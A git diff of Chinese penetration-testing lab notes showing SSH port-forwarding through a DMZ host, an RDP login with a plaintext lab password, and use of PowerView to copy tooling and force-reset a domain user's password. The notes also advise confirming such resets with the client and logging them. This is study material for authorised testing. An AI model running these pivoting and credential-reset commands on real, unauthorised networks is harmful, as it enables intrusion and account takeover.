@@ -370,11 +370,20 @@ bloodhound      打开GUI
 就有可能窃取凭据等敏感数据
 这一点值得作为一个发现记录下来；称之为 Excessive Active Directory Group Privileges（活动目录组权限过高），将其标记为中等风险
 如果整个组对某台主机拥有本地管理员权限 (local admin rights)，是一个高风险发现
-使用 PowerView 来更改 ssmalls 的密码
 
+使用 PowerView 来更改 ssmalls 的密码
 ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111            本地 13389 -> 枢纽 3389 -> 目标  （仅一个目标）      本地 -> 远程单一
   对比
   ssh -i dmz01_key -D 1080 root@10.129.203.111                             本地 13389 -> 枢纽 任意 -> 目标  （整个内网）        本地 -> 任意
   ssh -i dmz01_key -R 8080:127.0.0.1:80 root@10.129.203.111                枢纽 8080 -> 本地 80                               远程 -> 本地
 
-xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
+xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:remoteHome,"/home/local/tools"      把本地目录挂载为远程会话中的共享盘
+c:\DotNetNuke\Portals\0> net use      查看当前远程目录
+c:\DotNetNuke\Portals\0> copy \\TSCLIENT\remoteHome\PowerView.ps1 .      把 /home/tester/tools/PowerView.ps1 复制到远程当前目录
+更改密码
+C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
+C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
+在渗透测试期间应避免此类活动
+但如果这是唯一的路径
+与客户确认，多数客户会允许继续
+将此类更改记录在活动日志中，将其包含在报告的附录中
